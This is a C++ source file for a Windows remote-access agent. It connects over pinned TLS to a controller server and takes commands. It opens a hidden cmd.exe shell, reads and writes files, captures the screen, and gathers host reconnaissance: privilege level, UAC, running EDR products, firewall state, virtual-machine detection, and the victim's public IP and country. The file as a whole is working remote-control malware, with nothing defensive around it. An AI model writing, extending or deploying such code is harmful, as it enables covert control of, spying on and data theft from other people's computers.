#define _WIN32_WINNT 0x0601
#include "../common/proto.h"
#include "../common/tls.h"
#include "../common/util.h"
#include <windows.h>
#include <wininet.h>
#include <iphlpapi.h>
#include <cpuid.h>
#include <stdarg.h>
#include <stdio.h>
static const char kServer[] = "127.0.0.1:8443";
static const unsigned char kPin[32] = { 0x08,0x22,0x8D,0xA7,0x86,0x98,0x4D,0x60,0x9B,0x76,0xEA,0xF9,0xF8,0x5B,0xD7,0x97,0x0F,0xC3,0x8A,0x4F,0xB5,0x2C,0x7A,0x4B,0xB1,0xF4,0x69,0x1B,0x65,0xB3,0x1F,0x04 };
static TlsCtx* g_tls = NULL;
static volatile LONG g_run = 1;
static volatile LONG g_bye = 0;
static HANDLE g_hShellInW = NULL, g_hShellProc = NULL, g_hShellThread = NULL;
static CRITICAL_SECTION g_cs;
static char g_country[64] = "?", g_pubip[64] = "?";
static DWORD WINAPI ShellReader(LPVOID p) {
  HANDLE out = (HANDLE)p; char buf[4096]; DWORD n;
  while (ReadFile(out, buf, sizeof(buf), &n, NULL) && n) {
    EnterCriticalSection(&g_cs); if (g_tls && g_run) TlsSendMsg(g_tls, C_SHELL_DATA, buf, n); LeaveCriticalSection(&g_cs);
  }
  CloseHandle(out);
  EnterCriticalSection(&g_cs); if (g_tls && g_run) TlsSendMsg(g_tls, C_SHELL_CLOSE, NULL, 0); LeaveCriticalSection(&g_cs);
  return 0;
}
static void ShellStop() {
  HANDLE proc = g_hShellProc, in = g_hShellInW, th = g_hShellThread;
  g_hShellProc = g_hShellInW = g_hShellThread = NULL;
  if (proc) { TerminateProcess(proc, 0); CloseHandle(proc); }
  if (in) CloseHandle(in);
  if (th) { WaitForSingleObject(th, 1000); CloseHandle(th); }
}
static void ShellStart() {
  ShellStop();
  SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
  HANDLE inR, inW, outR, outW;
  if (!CreatePipe(&inR, &inW, &sa, 0)) return;
  if (!CreatePipe(&outR, &outW, &sa, 0)) { CloseHandle(inR); CloseHandle(inW); return; }
  SetHandleInformation(inW, HANDLE_FLAG_INHERIT, 0);
  SetHandleInformation(outR, HANDLE_FLAG_INHERIT, 0);
  STARTUPINFOA si = { 0 }; si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
  si.hStdInput = inR; si.hStdOutput = outW; si.hStdError = outW;
  PROCESS_INFORMATION pi = { 0 };
  if (!CreateProcessA(NULL, (LPSTR)"cmd.exe /Q /K chcp 65001 > nul", NULL, NULL, TRUE,
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
    CloseHandle(inR); CloseHandle(inW); CloseHandle(outR); CloseHandle(outW); return;
  }
  g_hShellInW = inW; g_hShellProc = pi.hProcess;
  CloseHandle(inR); CloseHandle(outW); CloseHandle(pi.hThread);
  g_hShellThread = CreateThread(NULL, 0, ShellReader, outR, 0, NULL);
  if (!g_hShellThread) CloseHandle(outR);
}
static char* FsList(const char* path, uint32_t* outLen) {
  char glob[MAX_PATH * 2]; int k = snprintf(glob, sizeof(glob), "%s", path && path[0] ? path : "C:\\");
  if (k < 0 || (size_t)k >= sizeof(glob) - 2) {
    char* e = (char*)malloc(32); if (!e) { *outLen = 0; return NULL; }
    strcpy(e, "ERR|path too long\n"); *outLen = 18; return e;
  }
  size_t len = strlen(glob);
  if (glob[len-1] != '\\' && glob[len-1] != '/') strcat(glob, "\\*"); else strcat(glob, "*");
  WIN32_FIND_DATAA fd;
  HANDLE h = FindFirstFileA(glob, &fd);
  if (h == INVALID_HANDLE_VALUE) {
    char* err = (char*)malloc(32); if (!err) { *outLen = 0; return NULL; }
    sprintf(err, "ERR|%lu\n", GetLastError()); *outLen = strlen(err); return err;
  }
  char* out = NULL; size_t outSize = 0, outCap = 0;
  do {
    uint64_t sz = ((uint64_t)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
    char line[512];
    sprintf(line, "%s|%llu|%s\n", fd.cFileName, sz, (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "d" : "f");
    size_t lineLen = strlen(line);
    if (outSize + lineLen + 1 > outCap) {
      outCap = (outCap + lineLen + 1) * 2;
      char* p = (char*)realloc(out, outCap);
      if (!p) { free(out); FindClose(h); *outLen = 0; return NULL; }
      out = p;
    }
    memcpy(out + outSize, line, lineLen); outSize += lineLen;
  } while (FindNextFileA(h, &fd));
  FindClose(h);
  if (!out) out = (char*)malloc(1);
  if (out) out[outSize] = 0;
  *outLen = (uint32_t)outSize; return out;
}
struct Buf { char* p; size_t n, cap; };
static void Put(Buf* b, const char* fmt, ...) {
  char t[1024]; va_list ap; va_start(ap, fmt); int k = vsnprintf(t, sizeof(t), fmt, ap); va_end(ap);
  if (k <= 0) return;
  if (b->n + k + 1 > b->cap) { b->cap = (b->n + k + 1) * 2; char* q = (char*)realloc(b->p, b->cap); if (!q) return; b->p = q; }
  memcpy(b->p + b->n, t, k); b->n += k; b->p[b->n] = 0;
}
static bool RegStr(HKEY root, const char* key, const char* val, char* out, DWORD n) {
  DWORD sz = n; return RegGetValueA(root, key, val, RRF_RT_ANY, NULL, out, &sz) == ERROR_SUCCESS;
}
static DWORD RegDw(HKEY root, const char* key, const char* val, DWORD def) {
  DWORD v = def, sz = sizeof(v); return RegGetValueA(root, key, val, RRF_RT_REG_DWORD, NULL, &v, &sz) == ERROR_SUCCESS ? v : def;
}
static bool RtlVer(OSVERSIONINFOW* vi) {
  typedef LONG (WINAPI* Fn)(OSVERSIONINFOW*);
  HMODULE nt = GetModuleHandleA("ntdll.dll"); Fn fn = nt ? (Fn)GetProcAddress(nt, "RtlGetVersion") : NULL;
  OSVERSIONINFOW z = { sizeof(z) }; *vi = z; return fn && fn(vi) == 0;
}
static const char* WinName() {
  static char name[32];
  if (name[0]) return name;
  OSVERSIONINFOW vi; DWORD b = RtlVer(&vi) ? vi.dwBuildNumber : 0;
  const char* v = b >= 22000 ? "11" : b >= 10240 ? "10" : b >= 9600 ? "8.1" : b >= 9200 ? "8"
                : b >= 7600 ? "7" : b >= 6000 ? "Vista" : b >= 2600 ? "XP" : "";
  sprintf(name, "Windows%s%s", v[0] ? " " : "", v); return name;
}
static DWORD PhysCores() {
  DWORD len = 0, cores = 0; GetLogicalProcessorInformationEx(RelationProcessorCore, NULL, &len);
  char* buf = (char*)malloc(len ? len : 1); if (!buf) return 0;
  if (GetLogicalProcessorInformationEx(RelationProcessorCore, (PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX)buf, &len))for (char* p = buf; p < buf + len; p +=((PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX)p)->Size) cores++;
  free(buf); return cores;
}
static DWORD SvcState(const char* name) {
  SC_HANDLE m = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT); if (!m) return 0;
  SC_HANDLE s = OpenServiceA(m, name, SERVICE_QUERY_STATUS); SERVICE_STATUS st = {0};
  DWORD r = (s && QueryServiceStatus(s, &st)) ? st.dwCurrentState : 0; if (s) CloseServiceHandle(s);
  CloseServiceHandle(m); return r;
}
static void AddAddr(char* out, size_t n, SOCKET_ADDRESS* a) {
  char ip[NI_MAXHOST] = "";
  if (!a->lpSockaddr || getnameinfo(a->lpSockaddr, (socklen_t)a->iSockaddrLength, ip, sizeof(ip), NULL, 0, NI_NUMERICHOST)) return;
  size_t l = strlen(out); if (l + 2 >= n) return; snprintf(out + l, n - l, "%s%s", l ? "," : "", ip);
}
static void Trim(char* s) { size_t n = strlen(s); while (n && (s[n-1] == '\r' || s[n-1] == '\n' || s[n-1] == ' ')) s[--n] = 0; }
static char* SysInfo(uint32_t* outLen) {
  Buf b = {0};
  char host[256] = "", user[256] = "", dom[256] = "", dir[MAX_PATH] = "";
  DWORD n = sizeof(host); GetComputerNameA(host, &n); n = sizeof(user); GetUserNameA(user, &n);
  n = sizeof(dom); if (!GetComputerNameExA(ComputerNameDnsDomain, dom, &n) || !dom[0]) strcpy(dom, "WORKGROUP");
  GetCurrentDirectoryA(sizeof(dir), dir);
  Put(&b, "host: %s\nuser: %s\ndomain: %s\n", host, user, dom);
  char prod[128] = "", dv[64] = ""; const char* cv = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
  RegStr(HKEY_LOCAL_MACHINE, cv, "ProductName", prod, sizeof(prod));
  RegStr(HKEY_LOCAL_MACHINE, cv, "DisplayVersion", dv, sizeof(dv));
  DWORD ubr = RegDw(HKEY_LOCAL_MACHINE, cv, "UBR", 0); OSVERSIONINFOW vi = { sizeof(vi) }; RtlVer(&vi);
  char tail[128] = ""; const char* s1 = strchr(prod, ' ');
  const char* s2 = s1 ? strchr(s1 + 1, ' ') : NULL; if (s2) strncpy(tail, s2 + 1, sizeof(tail) - 1);
  Put(&b, "os: %s%s%s%s%s (build %lu.%lu)\n", WinName(), tail[0] ? " " : "", tail, dv[0] ? " " : "", dv, vi.dwBuildNumber, ubr);
  ULONGLONG up = GetTickCount64() / 1000;
  Put(&b, "uptime: %llud %lluh %llum\n", up / 86400, (up / 3600) % 24, (up / 60) % 60);
  HANDLE tok = NULL; OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok);
  TOKEN_ELEVATION_TYPE et = TokenElevationTypeDefault; n = sizeof(et);
  if (tok) GetTokenInformation(tok, TokenElevationType, &et, sizeof(et), &n);
  const char* who = !strcmp(user, "SYSTEM") ? "SYSTEM" : et == TokenElevationTypeFull ? "admin (elevated)"
                  : et == TokenElevationTypeLimited ? "admin (UAC-limited)" : "user";
  const char* integ = "?";
  if (tok) {
    DWORD sz = 0; GetTokenInformation(tok, TokenIntegrityLevel, NULL, 0, &sz);
    TOKEN_MANDATORY_LABEL* ml = sz ? (TOKEN_MANDATORY_LABEL*)malloc(sz) : NULL;
    if (ml && GetTokenInformation(tok, TokenIntegrityLevel, ml, sz, &sz)) {
      DWORD r = *GetSidSubAuthority(ml->Label.Sid, *GetSidSubAuthorityCount(ml->Label.Sid) - 1);
      integ = r >= SECURITY_MANDATORY_SYSTEM_RID ? "System" : r >= SECURITY_MANDATORY_HIGH_RID ? "High"
            : r >= SECURITY_MANDATORY_MEDIUM_RID ? "Medium" : "Low";
    }
    free(ml); CloseHandle(tok);
  }
  Put(&b, "rights: %s, integrity %s, UAC %s\n", who, integ,
    RegDw(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", 1) ? "on" : "off");
  Put(&b, "public ip: %s\n", g_pubip);
  char cpu[128] = "";
  const char* ckey = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";
  RegStr(HKEY_LOCAL_MACHINE, ckey, "ProcessorNameString", cpu, sizeof(cpu)); Trim(cpu);
  SYSTEM_INFO si; GetSystemInfo(&si);
  Put(&b, "cpu: %s @ %lu MHz (%lu logical, %lu cores)\n", cpu,
    RegDw(HKEY_LOCAL_MACHINE, ckey, "~MHz", 0), si.dwNumberOfProcessors, PhysCores());
  MEMORYSTATUSEX ms = { sizeof(ms) }; GlobalMemoryStatusEx(&ms);
  Put(&b, "ram: %llu MB total, %llu MB free (%lu%% used)\n", ms.ullTotalPhys >> 20, ms.ullAvailPhys >> 20, ms.dwMemoryLoad);
  const char* gcls = "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}";
  for (int i = 0; i < 8; i++) {
    char key[256], desc[128] = ""; sprintf(key, "%s\\%04d", gcls, i); if (RegStr(HKEY_LOCAL_MACHINE, key, "DriverDesc", desc, sizeof(desc))) Put(&b, "gpu: %s\n", desc);
  }
  DWORD drives = GetLogicalDrives();
  for (int i = 0; i < 26; i++) if (drives & (1u << i)) {
    char root[8]; sprintf(root, "%c:\\", 'A' + i); UINT t = GetDriveTypeA(root); if (t == DRIVE_NO_ROOT_DIR || t == DRIVE_REMOTE) continue;
    ULARGE_INTEGER tot = {0}, fr = {0}; GetDiskFreeSpaceExA(root, NULL, &tot, &fr);
    Put(&b, "disk %s %s: %.1f GB free of %.1f GB\n", root,
      t == DRIVE_FIXED ? "fixed" : t == DRIVE_REMOVABLE ? "removable" : t == DRIVE_CDROM ? "cdrom" : "other",
      fr.QuadPart / 1073741824.0, tot.QuadPart / 1073741824.0);
  }
  ULONG asz = 0; GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_GATEWAYS, NULL, NULL, &asz);
  IP_ADAPTER_ADDRESSES* aa = (IP_ADAPTER_ADDRESSES*)malloc(asz ? asz : 1);
  if (aa && GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_GATEWAYS, NULL, aa, &asz) == NO_ERROR) {
    for (IP_ADAPTER_ADDRESSES* p = aa; p; p = p->Next) {
      if (p->IfType == IF_TYPE_SOFTWARE_LOOPBACK) continue;
      char nm[128] = "", ips[512] = "", dns[256] = "", gw[128] = "", mac[32] = ""; WideCharToMultiByte(CP_UTF8, 0, p->FriendlyName, -1, nm, sizeof(nm), NULL, NULL);
      for (IP_ADAPTER_UNICAST_ADDRESS* u = p->FirstUnicastAddress; u; u = u->Next) AddAddr(ips, sizeof(ips), &u->Address);
      for (IP_ADAPTER_DNS_SERVER_ADDRESS* d = p->FirstDnsServerAddress; d; d = d->Next) AddAddr(dns, sizeof(dns), &d->Address);
      for (IP_ADAPTER_GATEWAY_ADDRESS* g = p->FirstGatewayAddress; g; g = g->Next) AddAddr(gw, sizeof(gw), &g->Address);
      if (p->PhysicalAddressLength >= 6) { unsigned char* m = p->PhysicalAddress; sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]); }
      Put(&b, "net: %s%s mac %s ip %s dns %s gw %s\n", nm, p->OperStatus == IfOperStatusUp ? "" : " (down)",
        mac[0] ? mac : "-", ips[0] ? ips : "-", dns[0] ? dns : "-", gw[0] ? gw : "-");
    }
  }
  free(aa);
  const char* iset = "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"; DWORD pe = RegDw(HKEY_CURRENT_USER, iset, "ProxyEnable", 0);
  char ps[256] = "", ac[256] = ""; RegStr(HKEY_CURRENT_USER, iset, "ProxyServer", ps, sizeof(ps)); RegStr(HKEY_CURRENT_USER, iset, "AutoConfigURL", ac, sizeof(ac));
  Put(&b, "proxy: %s\n", pe && ps[0] ? ps : ac[0] ? ac : "direct");
  const char* edr = SvcState("Sense") == SERVICE_RUNNING ? "Defender ATP" : SvcState("CSFalconService") == SERVICE_RUNNING ? "CrowdStrike" : SvcState("SentinelAgent") == SERVICE_RUNNING ? "SentinelOne" : "none";
  Put(&b, "security: defender %s, firewall %s, edr %s\n",
    SvcState("WinDefend") == SERVICE_RUNNING ? "running" : "off",
    RegDw(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", "EnableFirewall", 0) ? "on" : "off",
    edr);
  unsigned a = 0, c1 = 0, c2 = 0, d1 = 0; char hv[13] = "", bios[512] = "";
  if (__get_cpuid(1, &a, &c1, &c2, &d1) && (c2 >> 31)) {
    __get_cpuid(0x40000000, &a, &c1, &c2, &d1); memcpy(hv, &c1, 4); memcpy(hv + 4, &c2, 4); memcpy(hv + 8, &d1, 4);
  }
  RegStr(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", "SystemBiosVersion", bios, sizeof(bios));
  const char* virt = !hv[0] ? NULL : strstr(hv, "VMware") ? "VMware" : strstr(hv, "VBox") ? "VirtualBox"
                   : strstr(hv, "KVM") ? "KVM/QEMU" : strstr(hv, "Microsoft Hv") ? "Hyper-V"
                   : strstr(hv, "Xen") ? "Xen" : strstr(hv, "TCG") ? "QEMU" : hv;
  if (!virt) virt = strstr(bios, "VBOX") ? "VirtualBox" : strstr(bios, "VMWARE") ? "VMware" : "none";
  Put(&b, "virt: %s\n", virt);
  Put(&b, "cwd: %s\npid: %lu\n", dir, GetCurrentProcessId());
  *outLen = (uint32_t)b.n; return b.p;
}
static char* Screenshot(uint32_t* outLen) {
  *outLen = 0;
  int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN), vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
  int vx = GetSystemMetrics(SM_XVIRTUALSCREEN), vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
  if (vw <= 0 || vh <= 0 || vw > 32767 || vh > 32767 || (int64_t)vw * vh > 100000000LL) return NULL;
  HDC scr = GetDC(NULL), mem = CreateCompatibleDC(scr);
  HBITMAP bm = (scr && mem) ? CreateCompatibleBitmap(scr, vw, vh) : NULL;
  HGDIOBJ old = (mem && bm) ? SelectObject(mem, bm) : NULL;
  char* out = NULL;
  if (mem && bm && old && old != HGDI_ERROR && BitBlt(mem, 0, 0, vw, vh, scr, vx, vy, SRCCOPY | CAPTUREBLT)) {
    BITMAPINFO bi = {0}; bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = vw; bi.bmiHeader.biHeight = vh;
    bi.bmiHeader.biPlanes = 1; bi.bmiHeader.biBitCount = 24; bi.bmiHeader.biCompression = BI_RGB;
    int rowBytes = (vw * 3 + 3) & ~3; DWORD px = (DWORD)rowBytes * (DWORD)vh;
    BITMAPFILEHEADER fh = {0};
    fh.bfType = 'B' | ('M' << 8); fh.bfOffBits = sizeof(fh) + sizeof(BITMAPINFOHEADER); fh.bfSize = fh.bfOffBits + px;
    out = (char*)malloc(fh.bfSize);
    if (out) {
      memcpy(out, &fh, sizeof(fh)); memcpy(out + sizeof(fh), &bi.bmiHeader, sizeof(BITMAPINFOHEADER));
      if (GetDIBits(mem, bm, 0, vh, out + fh.bfOffBits, &bi, DIB_RGB_COLORS)) *outLen = fh.bfSize;
      else { free(out); out = NULL; }
    }
  }
  if (old && old != HGDI_ERROR) SelectObject(mem, old);
  if (bm) DeleteObject(bm); if (mem) DeleteDC(mem); if (scr) ReleaseDC(NULL, scr);
  return out;
}
static void FetchCountry() {
  HINTERNET h = InternetOpenA("cachyos_govno", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
  if (!h) return;
  DWORD t = 3000;
  InternetSetOptionA(h, INTERNET_OPTION_CONNECT_TIMEOUT, &t, sizeof(t));
  InternetSetOptionA(h, INTERNET_OPTION_SEND_TIMEOUT, &t, sizeof(t));
  InternetSetOptionA(h, INTERNET_OPTION_RECEIVE_TIMEOUT, &t, sizeof(t));
  HINTERNET u = InternetOpenUrlA(h, "https://api.country.is/", NULL, 0,
    INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
  char buf[256] = {0}; DWORD r = 0, got = 0;
  if (u) { while (got < sizeof(buf) - 1 && InternetReadFile(u, buf + got, (DWORD)(sizeof(buf) - 1 - got), &r) && r) got += r; InternetCloseHandle(u); }
  InternetCloseHandle(h);
  char* c = strstr(buf, "\"country\":\"");
  if (c) { c += 11; char* e = strchr(c, '"'); if (e) { *e = 0; snprintf(g_country, sizeof(g_country), "%s", c); } }
  char* i = strstr(buf, "\"ip\":\"");
  if (i) { i += 6; char* e = strchr(i, '"'); if (e) { *e = 0; snprintf(g_pubip, sizeof(g_pubip), "%s", i); } }
}
static bool AuthAgent(TlsCtx* t) {
  uint16_t cmd = 0; char* p = NULL; uint32_t n = 0; unsigned char proof[32];
  bool ok = TlsRecvMsg(t, &cmd, &p, &n) && cmd == C_AUTH && n == 16 && AuthProof((unsigned char*)p, n, proof) && TlsSendMsg(t, C_AUTH, proof, 32);
  free(p); return ok;
}
static DWORD WINAPI Worker(const char* addr) {
  char host[256] = {0}; int port = 8443;
  strncpy(host, addr, 255);
  char* colon = strchr(host, ':');
  if (colon) { *colon = 0; port = atoi(colon + 1); }
  struct addrinfo* ai = NULL;
  char portStr[16]; sprintf(portStr, "%d", port);
  if (getaddrinfo(host, portStr, NULL, &ai) != 0) return 0;
  SOCKET s = INVALID_SOCKET;
  for (auto p = ai; p; p = p->ai_next) {
    s = socket(p->ai_family, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) continue;
    if (connect(s, p->ai_addr, (int)p->ai_addrlen) == 0) break;
    closesocket(s); s = INVALID_SOCKET;
  }
  freeaddrinfo(ai); if (s == INVALID_SOCKET) return 0;
  TlsCtx* t = (TlsCtx*)malloc(sizeof(TlsCtx)); if (!t) return 0;
  InitTlsCtx(t, s);
  if (!TlsAcquire(t, NULL) || !TlsHandshake(t, kPin) || !AuthAgent(t)) { FreeTlsCtx(t); free(t); closesocket(s); return 0; }
  EnterCriticalSection(&g_cs); g_tls = t; LeaveCriticalSection(&g_cs);
  char hbuf[256] = {0}, ubuf[256] = {0}; DWORD n = sizeof(hbuf);
  GetComputerNameA(hbuf, &n); n = sizeof(ubuf); GetUserNameA(ubuf, &n);
  char hello[1024]; sprintf(hello, "%s|%s|%s|%s", hbuf, ubuf, WinName(), g_country);
  TlsSendMsg(t, C_HELLO, hello, strlen(hello));
  uint16_t cmd = 0; char* pl = NULL; uint32_t plLen = 0;
  for (;;) {
    if (!TlsRecvMsg(t, &cmd, &pl, &plLen)) break;
    switch (cmd) {
      case C_SHELL_START: ShellStart(); break;
      case C_SHELL_CLOSE: ShellStop(); break;
      case C_SHELL_DATA: if (g_hShellInW && pl) { DWORD w; WriteFile(g_hShellInW, pl, plLen, &w, NULL); } break;
      case C_FS_LIST: { uint32_t n; char* r = FsList(pl, &n); if (r) { TlsSendMsg(t, C_FS_LIST_RESP, r, n); free(r); } break; }
      case C_FS_GET: {
        uint32_t n = 0; char* d = pl ? ReadFileAll(pl, &n) : NULL; size_t pn = pl ? strlen(pl) : 0;
        if (!d || pn + 2 + (size_t)n > MAX_MSG) {
          char e[64]; int el = snprintf(e, sizeof(e), "E%s\n", d ? "file too large (64 MB limit)" : "cannot read file");
          TlsSendMsg(t, C_FS_FILE, e, el); free(d); break;
        }
        char* out = (char*)malloc(pn + 2 + n);
        if (out) { out[0] = 'D'; memcpy(out + 1, pl, pn); out[pn + 1] = '\n'; memcpy(out + pn + 2, d, n); TlsSendMsg(t, C_FS_FILE, out, (uint32_t)(pn + 2 + n)); free(out); }
        free(d); break;
      }
      case C_FS_PUT: {
        if (!pl) break;
        char* nl = strchr(pl, '\n');
        if (nl) { *nl = 0; WriteFileAll(pl, nl + 1, plLen - (uint32_t)(nl - pl) - 1); }
        break;
      }
      case C_SYSINFO: { uint32_t n; char* r = SysInfo(&n); if (r) { TlsSendMsg(t, C_SYSINFO, r, n); free(r); } break; }
      case C_SCREEN: { uint32_t n; char* bmp = Screenshot(&n); if (bmp) { TlsSendMsg(t, C_SCREEN_IMG, bmp, n); free(bmp); } break; }
      case C_BYE: g_bye = 1; goto done;
    }
    if (pl) { free(pl); pl = NULL; }
  }
done:
  ShellStop();
  EnterCriticalSection(&g_cs); g_tls = NULL; LeaveCriticalSection(&g_cs);
  TlsSendMsg(t, C_BYE, NULL, 0);
  closesocket(s); FreeTlsCtx(t); free(t);
  return 0;
}
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
  InitializeCriticalSection(&g_cs);
  WSADATA w; WSAStartup(MAKEWORD(2, 2), &w);
  const char* addr = (lpCmdLine && *lpCmdLine) ? lpCmdLine : kServer;
  while (*addr == ' ') addr++;
  FetchCountry();
  while (!g_bye) { Worker(addr); if (!g_bye) Sleep(3000); }
  return 0;
}
